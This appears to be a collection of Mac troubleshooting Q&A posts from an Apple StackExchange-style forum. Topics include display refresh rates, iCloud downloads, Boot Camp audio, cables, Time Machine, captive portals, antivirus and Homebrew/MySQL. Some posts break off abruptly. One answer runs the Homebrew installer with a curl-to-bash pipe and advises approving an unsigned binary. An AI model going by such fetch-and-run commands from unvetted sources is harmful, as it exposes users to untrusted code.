I just purchased a Dell P2175Q monitor for my 15\" MBP w/Touchbar. I'm connecting with a USB-C to DisplayPort cable, but when I go to Apple > System Preference > Displays, there is nothing about the Refresh Rate. Pressing the Option key does not show any additional options.\nI've seen countless screenshots where this information should appear. Is there another way to check the refresh rate?\nI'm on macOS 10.13.4\nThanks.\n\n\nA: You can also use a command-line tool called cscreen\n# install homebrew if you don't have it already\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n\n# install cscreen\nbrew install cscreen\n\n# list displays\ncscreen -l\n\nThe output will look like this\n(base) 12:06:41 jupyter ~$ cscreen -l\nDisplayID  Index     Depth     Width     Height  Refresh\n1c81fe45       1        32      2560       1440    60\n 4281006       2        32      1680       1050     0\n\nNote that with macOS Catalina, the first time you try to open the cscreen the os will not allow it because it isn't signed. You have to go to \"Security & Privacy\" in \"System Preferences\" and allow it.\n\nA: After pressing the option key while clicking the \"Scaled\" radio button, tick the box \"Show low resolution modes.\" This will show the refresh rate.\n\n\nA: You need to hold down the option-key while clicking the \"Scaled\" radio button to bring up the hidden part of the interface.\nHowever, usually this does not give you any information on Refresh rate on this type of monitor as you cannot set it anyways.\nYou can click the Apple-logo in the top-left corner of the display, choose \"About this Mac\" and then \"System Report\" to bring up the system report. Choose \"Graphics/Displays\" and you'll have the information on the monitor. In the listing \"Resolution\" you'll see the refresh rate.\nNote: Changing refresh rate might not be supported for the built-in display on some models, and in that case this option only appears if an external display that supports changing the refresh rate is connected to your Mac.\n", "Q: Is there a way via the command line to cause .icloud files to download? Under iCloud in the Settings app, I have \"Optimize Mac Storage\" checked and \"Desktop & Documents Folders\" checked under \"Apps that store documents and data in iCloud will appear here:\"\n\nThis will cause some files in my \"Documents\" folder to be offloaded and replaced with a small file ending in \".icloud\".

I can also use \"find\" from the command line to show which files have been offloaded, eg \"find . -name *.icloud | more\". \nIs there a command line way to cause these files to be downloaded, either by file or directory?\n\nA: To my knowledge, there is no command included that allows you to directly download an iCloud file or folder. \nBut since I had exactly the same problem as you, I found that it was possible to do it in Swift with the startDownloadingUbiquitousItem function.\nSo I wrote a really simple Swift script for downloading both folder and file. You can download it on Github: iCloud Downloader\nI hope I have answered your issue. \n\nA: Scott Garret and Allan’s answer above is very close.\nIn the terminal, however, each *.icloud file is prefixed with a . when NOT downloaded.\nFor example, a directory called foo with optimised (i.e., offloaded to icloud) files a.txt and b.txt will look like this\n$ cd foo\n$ find . -name '.*icloud’\n./.a.txt.icloud\n./.b.txt.icloud\n\nTo resolve (i.e., download) the files from icloud, you need to pass the path to the resulting path to /usr/bin/brctl.\nThus, the following works.\nfind . -name '.*icloud' | perl -pe 's|(.*)/.(.*).icloud|$1/$2|s' | while read file; do brctl download \"$file\"; done\n\nYou can monitor the download activity as per this answer as follows :\nbrctl log --wait --shorten\n\n\nA: The command you are looking for is brctl (located in /usr/bin).  man brctl will tell you all you need, but basically just brctl download /path/to/filename (without the .icloud extension)  and evict will purge the locally cached copy.\n", "Q: Windows 10 on 2011 Macbook: is audio fixable? I've been trying to install Windows 10 on an early 2011 Macbook Pro. It's not officially supported, but I  read everywhere it can be done. There are some troubles though.\nI have successfully installed it alongside MacOS High Sierra actually, and everything works fine except for audio. I get the exclamation point on Device Manager and a message saying the device couldn't be started properly.\nI found out audio doesn't work because Uefi Windows 10 installation somehow keeps a Cirrus audio-related device from working. At least that's what I understood after googling myself to death.\nSo I tried to install Windows 10 in Legacy/Bios mode. I chose \"Windows\" for the setup DVD instead of \"Uefi Boot\" at boot.\nBut just before the point where Windows usually asks which disk to install on, it actually asks for a missing driver. This doesn't happen when installing in Uefi mode. I tried feeding it Intel xHCI drivers with usb keys, it sees the keys but says it doesn't find any driver.\nI wasn't able to use Boot Camp and had to prepare everything by hand, since I don't get the option to install Windows 10 from Boot Camp, only 8 and 7. If I try to install Windows 10, Boot Camp says the OS is not supported.\nI conclude this behavior due to the fact the disk is partitioned in Uefi mode.\nIs it impossible to install Windows 10 in Bios mode in such a setup?\n\nA: I have the solution for audio to work UEFI windows 10\nhttps://apple.stackexchange.com/a/350469/319791\nThis took 4 years to figure out \n\nA: On my MacBook Pro (8,1 early 2011, MacOS 10.13) I first installed Win 7 via BootCamp and Win 7 install DVD. In Win 7 I installed the Win 7 drivers supplied by BootCamp. Then I downloaded MediaCretionTool from MS and with it I installed Win 10 over Win 7. After booting Win 10 Hardware Manager showed a few missing drivers. From https://www.driverscape.com/manufacturers/apple/laptops-desktops/macbookpro8%2C1/1927 I downloaded and installed the following missing drivers:\n\n*\n\n*apple_broadcom_bluetooth_5040_win64\n\n*apple_broadcom_cardreader_100243_win64 => BroadcomCardReader64.exe\n\n*apple_cirrus_logic_hd_audio_win64 => CirrusAudioCS4206x64.exe\n\n*FaceTime HD camera\n\n*Intel_hd_graphics_win64_153332 => DisplayAudio\n\n*intel_mei_10.0.27.1012 => PCI\n\nAfter that I updated some of the drivers via Windows Update. Now everything works fine.\n\nA: I did it like this: I let Bootcamp start installing Windows 8.1.\nThen on the first reboot I booted from a setup DVD and installed Windows 10 over that, using BIOS mode. After I did all this, installing Boot Camp software in Windows gave me a fully working Windows 10, with audio too.\n", "Q: Are TB3 cables in any way different than USB-C cables? My company provided me a Lenovo USB-C dock when I received my Mac Book Pro 2017 model. That dock worked to a certain degree, but I happily replaced it with the Lenovo TB3 dock this week (which basically works much better, not having the quirks of the USB-C dock).\nWhat caught my attention: the TB3 dock comes with a cable that has a \"lightning\" label (probably to indicate it can transmit power) and a \"3\" printed on it. \nThing is: the USB-C cable is a bit longer (like 40 cm) whereas the TB3 cable is a bit shorter. So I tried connecting the dock using the longer cable ... and interestingly enough it worked, but one of my two monitors connected to the dock would stay dark. \nAccording to this here, USB-C cables should be \"equivalent\" (unless getting to long), but I just experienced something else.\nCan anyone shed some light on this? Are there physical differences between these cables?\n\nA: The \"lightning\" does not indicate that it can transmit power - it is actually the Thunderbolt logo indicating that it is a Thunderbolt cable.\nAll Thunderbolt 3 cables have USB-C connectors. Note that this is just the connector itself - it doesn't mean that the rest of the cable is the same.\nOrdinary Thunderbolt 3 cables (i.e. cobber-based) also work as USB-C cables. In this manner they are compatible. You can buy optical Thunderbolt 3 cables (eg. if you want a 50 meter cable) - these are normally not usable as a USB-C cable.\nOn the other hand any USB-C cable is not Thunderbolt 3 compatible. It might be (as ordinary Thunderbolt 3 cables also work as USB-C cables). In general they are not.\nThe differences are mainly the design and quality of the cable, and to which standard they have been tested before leaving the factory. For example Thunderbolt 3-cables are generally specced to allow much higher amounts of power delivery than USB-C cables.\n\nA: Nearly every USB-C to USB-C cable on the market is a passive copper cable.  With a passive copper cable we can achieve only so much data throughput before the signal gets mangled by electric resistance or something.  The longer the cable the less data bandwidth.\nThis means USB 2.0 cables can be as long as 2 or 3 meters.  (I believe 3 meter passive USB cables technically violate the spec but they work well enough that people buy and use them without too much complaint.)  USB 3.x cables can be as long as 1 meter, and Thunderbolt cables as long something like 3/4 of a meter.  If the cable is just right then a 1 meter USB 3.x cable will pass the self test for Thunderbolt when plugged in but almost certainly at a lower data rate.  With the lower data rate you’ll see effects from limited bandwidth, like a display going dark.\nThere are active Thunderbolt cables that can be longer than 3/4 meter, much longer.  There’s 30 meter (thirty meter, I spell that out so people don’t think it is a typo) Thunderbolt cables but these will be active, usually optical, and quite more expensive than passive cables.\nOne note is that USB-C is a type of connector, not a protocol.  Calling something a “USB-C cable” isn’t always helpful because this can mean USB 3.x, Thunderbolt, USB 2.0, DisplayPort, and even some rare cables wired for HDMI or whatever that protocol is called for 3D glasses.  Because passive cables are cheap to make the length is almost always in indication of the bandwidth.  That is again 2 meters == USB 2.0, 1 meter == USB 3.x, 3/4 meter == Thunderbolt.\nThe USB spec requires USB-C cables to be labeled with the protocol it supports.  If the cable is a Thunderbolt cable then it should have a little thunderbolt symbol on it.  If the cable is a USB cable then it should have the USB trademarked trident icon, and the icon varies based on the version/speed.  USB 1.1/2.0 cables will have the original trident.  USB 3.x cables will have the trident with the “SS” integrated into the symbol.  USB4 cables will have the trident with the number 20 or 40 integrated into it, with that number indicating max supported bandwidth in Gbps.  USB 3.x cables sometimes have a small 5, 10, or 20 on them for maximum tested bandwidth but the way the spec is written that number really doesn’t mean much in practice, it works or it doesn’t.  Then there’s icons for other protocols as well, and those are less common.  Basically the symbol on the cable should match one of the symbols on the port for it to work, sometimes the symbols don’t match and it still works which is perhaps quite common.\nWhat is a bit frustrating is not all hardware manufacturers label the ports as they should, so you are left digging through spec sheets or using trial-n-error to find what works.  There’s a lot of cheap USB-C cables out there that don’t bother with labeling the cables, but most of the time just the length indicates the speed.\nThere’s more to discuss about the power ratings of USB-C cables but I’ll leave that alone as this is already long and that part is perhaps off-topic.\n", "Q: VMWare Fusion OS X 10.13.5 GUID partition I'm using VMWare Fusion 8.5.10, and OS X 10.13.5 as client. \nIn VMWare I shutdown the vm first, then I increased the size of the virtual hard disk.

E.g. photos in 100-111APPLE show up sorted by dates taken by each folder, but overall in the camera roll they are not. Is there a reason sorting is applied per folder?\nAlso, for some reason 109APPLE appeared at the very end of the camera roll - why could that be?\nI was going through the Photos db (wow it got much messier since iOS 6), and couldn't deduce the sort order in the Camera Roll. Previously, the general belief was it is sorted by Date Created or Date Added, but when I sort the db by these parameters, photo order is different from what I see in the roll.\nTo make matters worse, not all (per-folder) sorting appears to be correct, as I have at least 2 photos from Jan12 that follow Apr12, and these 2 photos go from 17Jan12 to 16Jan12. I've tried sorting the folder in Explorer by pretty much all the attributes Windows gives me, and could not replicate this order. So my question is, what is going on? What is the primary key used for sorting the db in iOS 11?   \nP.S. I am aware I can manually run an sql query to copy ZDATECREATED to ZDATEADDED, but I want to understand, what is going on in the first place. Also not sure how manual sql edits would impact future exports to iCloud Photo Library.\nTLDR: iOS Camera Roll sorting is weird - by what attribute is it sorted? When I sort the sql table by ZDATEADDED it is not the same order as on device, however if I run a manual query to set ZDATEADDED to ZDATECREATED, it seems to sort by the updated Date Added/Date Created timestamp, making it look like ZDATEADDED is indeed the primary sort key.    Where does iOS even get Date Added (not from file/EXIF?), and how do I import photos into the camera roll preserving/setting the correct Date Added?   \nThanks for any help.   \n\nA: Right, the way iOS generates ZDATEADDED appears to be dependent on indexing order, and hence naming (correct me if I am wrong).\nSo if you want the Camera Roll to be ordered correctly by EXIF/file data, you'd need to bulk rename pre-sorted files in order, and then import.\nThank you iOS Photos.app for being such a delight\n", "Q: How to set the amount of IMAP email stored locally in Apple Mail? My provider told me that our mail server is suffering because of a HUGE usage, and, to be more specific, IMAP usage.\nI tracked down the issue to four Macs that use IMAP on quite big email accounts (more than 5GB each). \nMy guess is that Apple Mail is storing locally a little amount of email, and send all search requests directly to the server. Can I set Apple Mail to have all the emails locally (so that searches are done only locally)?\nThanks, \n\nA: (Assumptions: Clients are using Mail.app, clients are on a reasonably current version of the MacOS)\nThe point of IMAP is to store email on the server, so that the user can access their email from multiple devices and see the same list of messages. Also, this isn't a Mac specific thing, any email client using IMAP would be expected to maintain synced stores of email messages on both the client and the server, unless the user deliberately moves messages to a client-side only mailbox (which most clients allow).\nAs an aside, 5GB doesn't seem like a lot of email to me.\nI would not configure Mail.app to send all emails to a client-side mailbox, but instead encourage users to create \"On My Mac\" mailboxes and store older email messages there.\nTo create an \"On My Mac\" mailbox in Mail.app, in the \"Mailbox\" menu choose \"New Mailbox...\" in the window that appears allowing you to name the mailbox, make sure that the \"Location\" pop-up is set to \"On My Mac\". The user would then have to manually move over the messages they wanted to store locally to the new mailbox. Note that this means you lose the ability to see the same list of messages from another client (like a phone) and moves 100% of the burden of backups to the client (but presumably you are backing up the client already).\nTo see how much space is being used by the various IMAP email boxes, right-click on the main inbox and select \"Get Account Info\". This should bring up a window showing all the IMAP mailboxes (Sent, Draft, etc.) and the space used by each.\n", "Q: Recurring Volume damage + Time Machine issues This may take some explaining, so please bear with me.\nMac Pro 4,1/5,1 High Sierra 10.13.5\n4 HDs & a boot SSD installed.\nRelated to Add Recovery Partition to APFS drive? & peripherally to Mac Pro with permanently mounted Time Machine.

[I spent some time trying to thin those, but in the end gave up.]\n2 of the drives gave this error -  \nVolume [name] on disk3s2 has 0 bytes of trailing loader space and  \nit needs 134,217,728  \nProblems were found with the partition map which might prevent booting.\n\nThis was on 2 out of 3 almost identical Toshiba drives, all 3GB -\n2x DT01ABA300 &\n1x DT01ACA300\nBoth the ABA drives gave the same error including that very specific 134,217,728 bytes.\nThe ACA 3TB & another 4TB Toshiba came up clean.\nSteps taken so far to solve this...\nThere was an entire episode of trying to 'fix' the snapshots on the boot drive which you can read about on MicroMat's forum but is now irrelevant, I think. The drive itself passed all tests.\nI sacrificed the Time Machine drive [an ABA] to give me room to move data without losing it.\nBoot drive clones were done using Carbon Copy Cloner.\nThe 3TB HDs were done using Paragon Hard Disk Manager, because it's supposed to handle Boot Camp partitions better.\nI reformatted the SSD & the 2 erroring 3TB drives, in such a way that each set of volumes ended up on a different physical drive [this becomes very relevant.]\nSo, what was the 'clean' time machine drive became a multi-volume data drive instead & the 'dirty' drive became a clean Time Machine drive.\nI also cloned the boot drive to HFS+, reformatted the SSD as APFS & cloned back - thinking this way I wouldn't be carrying any snapshot or container data.\nAfterwards, all drives check clean.\nThis was the point at which I re-installed High Sierra over the top of the existing boot drive to regain a Recovery Partition. Re: Add Recovery Partition to APFS drive?\n24 hours later...\nTime Machine errors again.\nIt had completed the first full backup & presumably several incremental overnight. The boot drive shows 16 snapshots.\nTwo of my 3TB drives display the exact same error as before.\nbut this is the puzzling part.\nThe erroring 3TBs are not the same two drives as before... nor do they contain the same volumes as before. Previously, the two ABA's errored, containing Time Machine & '4 volumes' respectively.\nNow one ABA & one ACA are erroring, the '4 volumes' are now on one ABA when they used to be on the other, but the ACA was never touched. Time Machine is now on one of the previously erroring ABA's but has no errors.\nThe boot SSD comes up clean.\nI'm completely out of ideas.\nOther than these obvious underlying errors, I'm not seeing the machine misbehave at all.\nPlease let me know what diskutil commands might be useful in diagnosing this, or any other steps I could take to triage.\nLate edit:\nI uninstalled BitDefender & Time Machine appears to be behaving again.\nI'm still monitoring.\n...& failed again 2 hours later :/\n\nA: Not much of an answer, but I eventually solved both this issue & also Notification Centre - What happened to Calculator widget? by cloning the drive, reformatting to HFS+ & cloning back again.  \nNo amount of messing with APFS would fix it.\nLate Edit:\nSome time later I now have two of the ABA/ACA & the odd one out, an HDWQ Toshiba drives giving the odd \"Volume [name] on disk4s2 has 0 bytes of trailing loader space and it needs 134,217,728 bytes\" error.\nAlways that precise number.\nLate Late Edit:\nAll this trouble went away with Mojave [mainly].

I'm so new to macbook and I just download and update macOS to the latest version and it's not able to complete the installation. However I manage to get to the recovery mode but there's still a problem.\nWhen I select install macOS on the recovery mode, I am asked to choose the disk but I couldn't select Macintosh HD as it said, \n\n'You may not install to this volume because it is currently being\n  encrypted'\n\nHow do I fix this? Please help \nThank you \n\nA: I don't know how good this may work, but once you boot into recovery mode, from the menu bar on the top, under Utilities you should find Disk Utility. Once you open disk utility, select the disk you want to install the OS on, and then click the Mount option, this should give you a prompt to provide the password to unlock the drive. \nOnce you have successfully unlocked and mounted the drive, quit Disk Utilities, and the default window with the option to install macOS should come back, from thereon you may continue with the installation as usual.\nI didn't have the opportunity to boot in Recovery mode and make sure this works, so your milage may vary. Also, I would highly suggest you take a look at the guide posted by one of the comments, as well as make a back up of everything important in that drive before you proceed with this! Good luck!\n", "Q: How to exclude times for Time Machine backups via command line? I'd like to exclude specific times where Time Machine should not run. This is so that I can create an off-site backup of the Time Machine backup for disaster recovery purposes. I don't want a TM backup running while making this backup as it may create a copy in an inconsistent state.\nI realize there are tools that allow you to do this, but all require you to disable the Apple Time Machine scheduler, which I prefer to not to do. I'd also prefer not to install software I do not know or trust. Therefore, I'm looking for a command line solution to prevent Time Machine backups from occurring from 12AM to 6AM. \nI took a look at tmutil man pages and didn't see any way of including or excluding run times. However, I did see that one can stopbackup, disable, and enable the service using this utility. So perhaps, there's a way to easily schedule these commands to run at certain times? For example:\nRun these commands at 12:00AM:\nsudo tmutil disable\nsudo tmutil stopbackup\n\nThen turn things back on at 6:00AM:\nsudo tmutil enable\n\nI tried using iCal with those commands in an .sh file, but nothing happen. I read about launchd, but I'm out of my comfort zone with getting that going, especially since these need to run as root.\n\nA: There is no option to exclude certain times but there is an option to define times to run a backup. If you want to exclude working hours, 9 am to 6 pm, for example, you could tell Time Machine to make a backup between 18:00 hours to 9:00 (6 pm to 9 am). Forcing Time Machine to these hours essentially excludes your window. \n", "Q: How captive.apple.com is used by non-Apple devices? Every time, I try to use my hotel's WiFi network, at some point of loging-in to it, I see that my browser (or WiFi connection pop-up) is redirecting through serie of websites, among which I can clearly see http://captive.apple.com/.\nThe thing is that I have absolutely nothing in common with any Apple-like device, because:\n\n\n*\n\n*I'm using either PC and Windows 7 (with Chrome) or Android device (with WiFi pop-up),\n\n*I'm pretty sure that neither my hotel network's router nor any of its components isn't build up based on Apple device, simply due to costs (non-Apple-based solutions are cheaper, I think).\n\n\nThis answer and this question roughly explains (to a non-Apple user, like me), what this site or service is used for. But, the question remains: What it has to do with non-Apple devices or how such devices can be using it (how or why non-Apple device can be using Apple-like service)?\n\nA: Source:\n\nMost hotspots implement customer interaction by using a captive portal, which is a restricted network connection in which all client HTTP requests are redirected to the provider’s web site. The web site can then prompt users to agree to the operator’s terms and conditions, enter payment information, or enter credentials to verify prior payment arrangements.\n\nApple hosts a landing page and makes a synthetic call to this when you join a network to test if the network is captive. Other vendors have similar portal detection hosts like www.msftncsi.com to detect captive networks, that's all. \nIt doesn't matter if the device you're using is a Mac, iPhone, Pixel, or Windows. The \"Apple\" part is only because they made it much easier for companies to offer wifi to their customers.\n\nA: Apple uses captive.apple.com to detect that you are on a captive network, and once it detects this, it does some very Apple-specific actions. Google and Microsoft use the same method, except with a different url. \nIf any application wants to detect it is on a captive network, it can connect to any of these websites (captive.apple.com or the Google or Microsft site), check the result, and that way detect a captive network. You absolutely don't need to run on an Apple, Google or Microsoft device for this. \nYou can visit captive.apple.com yourself from your browser, and you will get a page with just the word \"Success\". The trick is that a captive network will instead return a complicated page saying \"Please login to this network\". So all an app has to do is download from captive.apple.com and check that the response is \"Success\". If not, the app knows it's on a captive network. \n", "Q: time machine runs very slowly, then stops I've been using Time Machine with my MacBook Pro without issues for some time, however, I’m now having a problem that I haven’t had before: when connecting the external hard drive on which backups are stored, the “Preparing Backup” stage takes an inordinately long time, and when the actual backup starts, it proceeds really slowly (a couple of MB every minute or so) and then it completely stops. I don’t get an error code. This has happened with both Time Machine backup external hard disks that I use.\nCould this problem be related to the fact that I’m using two external hard disks for Time Machine backups? I’ve only run backups on two hdd once before.\nI’ve run First Aid on one of the external drives but Disk Utility returned an error unmounting the disk. I then ran First Aid on the Macintosh internal ssd drive but Disk Utility returned error: snap_metadata_val objet (oid ox75d3F): invalid externalref_tree_oid (0x0). Snapshot metadata tree is invalid. The volume /dev/rdisk1s1 could not be verified completely.\nAny thoughts why this might be happening and how to resolve the issue? I’m running High Sierra on a early 2015 MacBook Pro (upgraded from Yosemite). The two external hdds are formatted as HFS+. I've also swapped usb cables to make sure it's not a faulty cable causing the issue, but the same thing happens.\n\nA: I've just dealt with a similar issue, and hope I can help someone. I did a completely clean install of High Sierra, then Time Machine stopped working after four days.\nYour error message indicates that this is a problem with the drive you're backing up, or perhaps Time Machine's index of it.\nHere are the steps to take:\n\n\n*\n\n*Check your local snapshots, and delete anything fishy - see the empty one from the day that TM stopped working:\n\n\n\nYou would do this: sudo tmutil deletelocalsnapshots 2018-09-27-003128\n\n\n*Try using disk utility to repair all the volumes and drives again. If it's an APFS drive you're backing up, check all of the volumes, as well as the container volume and the disk. You can try deleting all the local snapshots too, and again try repairing the volumes and disks.\n\n*If that doesn't work, I would turn disable Time Machine - go into System Preferences and uncheck automatic backups. Unmount (restart if you have to) the drive with the most recent full backup on it - we don't want to touch that. Then, remove it by clicking \"Select Disk\" and \"Remove Disk.\" Try a backup then, with just the one drive. If that doesn't work, try repairing that drive again in Disk Utility.\n\n*The next thing to try would be to remove the drive that's still associated, rename it \"Time Machine Backups,\" and then add it back. You shouldn't lose the backups that are already there.\n\n*If all else fails, I would start over - reformat this drive in Disk Utility, but not as HFS+ Journaled - that was a mistake I made numerous times. We want Time Machine to format the drive. That should at least get you going again...\nMy problem was that it mysteriously wouldn't copy files.\nFor a week, no matter what I did, the same thing would happen - Time Machine would start, go very slowly, and then stop and give me this message:\n\nIt wouldn't complete an initial backup even. I had reformatted over and over (as HFS+ Journaled), deleted local snapshots, tried repairing the backup drive and the system drive.\nThe infuriating fix to my problem was simply to remove my encrypted APFS volume. fsck/First Aid kept returning a problem with the container and system volumes - \"mount apfs exit status 73\" and \"System check exit code is 78.\" All that was happening was that it couldn't mount the encrypted volume. After I deleted that, I was finally able to fix Time Machine.\nI still had trouble though, even after zeroing out the first 300MB of the backup drive to totally nuke the partition map and EFI. Eventually I formatted it as exFAT, let Time Machine format it, which it failed to do:\n\nAnd then I went back to Disk Utility and formatted it as HFS+ Journaled Case Sensitive. That's when it started working.\n", "Q: Video call and share writing This summer, I will be having meetings with my Ph.D. advisor, and since he's traveling, we'll be meeting via Skype or FaceTime.

Starting from the left side of this bar, there is the text Search: and next to it there are two buttons that say This Mac and the name of the current folder in double quotes. In Mac OS X 10.5 Leopard, and possible Mac OS X 10.6 Snow Leopard, there were two more buttons all the way over to the right that said Names (or maybe it was Filenames) and Contents. If Contents was selected, then Finder would look inside files for the text that is typed into the search bar.\nI'm on Mac OS X 10.11 El Capitan right now and there is no such choice of buttons (i.e., between Names and Contents). This has bugged me for several years, but now I'm done ignoring it. How can I make Finder search in files' contents? I presume that on the older version of Mac OS X, when Finder searched file contents, it didn't change the Last opened date of each file, too (which is how I want it). I don't want to use grep or another application. I want to make Finder behave like this. I will only accept an alternative browser application if it is sufficiently like Finder in terms of features and design.\n\nA: I'll put some pictures to the reply answers given.\n\n\n*\n\n*Add something to the search field to get the search options to show up. I just used a space in this example.\n\n*Click the + button to the right of save.\n\n\n*Choose contents from the left drop down menu and then type in your search term. You may need to clear out whatever you added in the main search field to not limit your results.\n\n\n*You can instead type content:search term in the main search field.\n\n\nA: I've always found Finder's file search capabilities quite limited.\nI'd suggest you look at the File Content Finder app on the app store (disclaimer - I'm its developer). It's specifically designed for searching file contents without indexing. It supports all major file formats - pdf, doc(x), xls(x), ppt(x), rtf, and others. It can also search in scanned png and jpg documents.\nIts filtering capabilities let you optimise and refine your search.\n\nA: I will suggest jEdit. It's the highly advanced and free tool (supports window, linux as well).\nYou can even find and replace in the directory including subdirectories upto any depth.\n", "Q: Does the newer MacBook Pro need anti virus I am purchasing MacBook Pro 2017 with Touch Bar and I was told by one customer representative of the shop that you need anti virus because old one use to come with build in anti virus but not the new one. \nIs it true? If so why? \n\nA: Since 2011 (macOS ~10.6.7), XProtect is the built in anti-malware tool from Apple.\nmacOS also has MRT (Malware Removal Tool) which complements XProtect in removing malware.\nEnsuring this is up-to-date is as simple as checking the box to ‘Install system data files and security updates’ in System Preferences → App Store.\n\nA: Sounds like a salesman is trying to make money off you...\nMacs have never been supplied with a built-in antivirus - they do have active prevention in such as Gatekeeper but no 'true' antivirus app.\nThey have traditionally not been the target of most viruses - Windows viruses won't run on Macs, of course - though there are some threats out there. Nothing is truly safe from predators.\nFull 'protection' is available from antivirus companies, just the same as for Windows. Some free, some paid. None of them is a complete guarantee.\nSome will slow the machine down more than others, just the same as on Windows.\nThere is no absolute authority on \"which antivirus is best\" for any platform, but the closest thing to an authority might be AV-TEST.org. Until recently they only had very generic reports on Mac AV, but they have now started taking the testing more seriously. \nOne app they don't test [lots of politics happened, not going to go into it] is Malwarebytes, which is a free 'on demand' scanner for Mac, i.e. it doesn't run constantly, only when you tell it to. It is possible to use it in conjunction with any other live-scan antivirus.\nOtherwise, never have more than one AV installed on any machine - they fight each other.\nLate edit: Malwarebytes v3 is now a full on-access scanner as well as on-demand.\nMany many Mac users have no antivirus at all. Macs have long been believed to be, if not immune, then \"not a target\".\nSo, the final call is yours, but don't be sold something just because the salesman wants you to spend more money.\nThink it over & do the research before you put your hand in your pocket.\n\nA: One thing that I want to add is that you may receive malicious files (executables, pdf files targeting buffer overflow exploits) targeted other platforms.\nYour system is probably safe even if you store those files. However, when you share the files (e.g. send them to others), they may harm other systems, such as those running older versions of Windows.\nAn effective antivirus program increases the chance of blocking the spread of such kind of files.\nNote that, unless your old MacBook comes with complimentary antivirus product (the usual case if you bought your MacBook from a reseller), the salesman made a false claim.\nFinally, if you do want to spend money for extra security, I would suggest you buy something like a (well-known) VPN service, or a trusted hardware set (“authorised” cables, routers etc).\n", "Q: Permanently Dismiss \"New iCloud Terms and Conditions\" on MacOS High Sierra I don't use and don't plan on ever using iCloud.

Wary of future issues if I had activated iCloud photo library on my phone simultaneously. I let this upload complete before activating iCloud photo library on my iPhone. This turned out to be a well founded precaution, because after turning iCloud photo library on my phone today, about half my photos are no longer accessible on my phone, but they are still on my mac and iCloud.com. \nOn my collections view in my iPhone's Photos app, I started by having many hundreds to a few thousand photos per year from 2008 to 2018 for all years. After turning on iCloud photo library, I now have no photos from 2008 or 2009, and only a handful remaining from 2010 to 2016. The photos that remain in my photos app might be only the ones that I took on my current phone (which I bought in 2016). How do I get the entire set of photos that are currently stored in iCloud photo library onto my phone again?\nEdit: \n     A more specific and descriptive timeline of events below:\nLet set \"A\" be all the photos that I want to exist on my mac, my iPhone, and iCloud. 1 week ago, my iPhone had A stored locally and iCloud was off. I then imported A from my iPhone to Photos on my mac. Now A is on my mac and my iPhone locally (iCloud library is still off). I then turned on iCloud library on on my mac and the upload occurred for about a week. As of this morning, A was in iCloud completely.\nAfter I confirmed that, I turned on iCould library on my iPhone, a device that had A stored locally already! Despite this, about 8 years worth of photos (2008-2016) are not accessible on my phone anymore! There should be no deletion / downloading between iCloud and my Phone because the set of pictures in both places was the same!\n\nA: I'm adding a summary of the discussions the OP and I had when trying to troubleshoot this issue.\nThis issue was due to how the OP copied the original photos: iPhone -> Mac -> iCloud.  The photos remained on the iPhone and the assumption was that iCloud would not have to do much work at all.  The exact same photos that were uploaded and sitting in iCloud were sitting on the iPhone. \nThe photos first had to be synced to iCloud from the Mac. With the large number of photos involved, that took several hours to complete. \nAfter that, iCloud then begins to sync the photos back down to the other devices signed-in with that same Apple ID, in this case it was the same iPhone.\nThe iPhone will only perform iCloud photo syncs when the device is on wifi and plugged-in to power (with iOS 11, you have the option to allow syncing on cellular connection via Settings -> Photos -> Cellular Data and turning on Cellular Data).\niCloud took over 9 hours to sync the photos back down to the iPhone, replacing all the exact same photos that were already stored there.\nTo avoid this, sync the photos from the iPhone -> iCloud first.  After that, it will sync down to the other devices, like the Mac.

(but I want to know what would happen to the other two folders (I can imagine the homebrew folder contain homebrew related stuff but I don't know what the run folder does at all).\nAlso, I used ls to list the content of /usr/local/var folder before I delete it so that means I may have missed some content that can be displayed by ls -la, so if there are any other files that I may have missed, can you tell me as well?\nDebugging info:\n$ brew --version\nHomebrew 1.6.9\nHomebrew/homebrew-core (git revision 7dac; last commit 2018-06-20)\n\nSystem Version: macOS 10.13.5 (17F77)\nKernel Version: Darwin 17.6.0\nI didn't do any backup and didn't use Time Machine.\n\nA: What are the implications?\nSince /usr/local one of the explict directories that SIP (System Integrity Protection) allows applications to write to, you will only harm applications that you install.\nWill you crash the overall system?\nNo.\nWill you make your system \"unusable\" based on what you've installed and configured?\nMore than likely.\n", "Q: Some PDFs do not snap to the window while using Preview I have a ton of college textbooks in PDF form, and I use Preview hours on end, every day; so this little problem becomes quite annoying:\nSome of my PDF files \"snap\" to the size of the window when I open them, and will stick to the size of the window as I resize it to my desired level of zoom (below, left). \n\n\nHowever, some PDF files do not adhere to this behavior, and I will have to resort to manually adjust the zoom level. This also becomes annoying since if I manually choose a zoom level, even though the file still fits in the window, both scrollbars become active i.e. as I scroll up and down the document, my scrolling skews to the left and right constantly (above, right).\nI have Acrobat Pro on my computer, and I have tried to find the right property to change, but to no avail. Does anyone have any fixes for this/ or knows what property I should be hunting for in Acrobat?\n\nA: The problem is the document.\nTypically, documents are set at 100%, so no matter the size of the window, it will automatically resize to fit the window.\nHowever, the actual page size may be set to a different value when it was created so, when opening, it starts at that value.\nFrom Adjusting PDF Views\n\nThe actual size for a PDF page is typically 100%, but the document may\n  have been set to another magnification level when it was created.\n\nSince you have Acrobat Pro, try creating a new PDF document and set the page properties to be at 100%.\n", "Q: brew install mysql@5.7 results in missing mysql bin I needed MySQL 5.7 installed so I ran brew install mysql@5.7.\nWhen I do brew services list I see mysql@5.7 started.\nWhen I try mysql -uroot I get an error that the bin could not be found.\nThis didn't happen when I simply ran brew install mysql but of course that results in the wrong version number.\nOutput of ps -A | grep *mysql* as requested:\n66836 ttys002    0:00.01 grep *mysql*\n\nThe output of find / -name *mysql* is contained in this gist.\nTo try to fix this I ran this:\nln -sfv /usr/local/opt/mysql@5.7/*.plist ~/Library/LaunchAgents\nlaunchctl load ~/Library/LaunchAgents/homebrew.mxcl.mysql@5.7.plist\n\nThen I added this to .bash_profile and reloaded:\nexport MYSQL_PATH=/usr/local/Cellar/mysql@5.7/5.7.22\nexport PATH=$PATH:$MYSQL_PATH/bin\n\nHowever, now I get this error when I type mysql -uroot:\nERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/tmp/mysql.sock’ (2)\n\nWhen I run mysqld I get this output:\n2018-06-22T17:56:45.699316Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated.

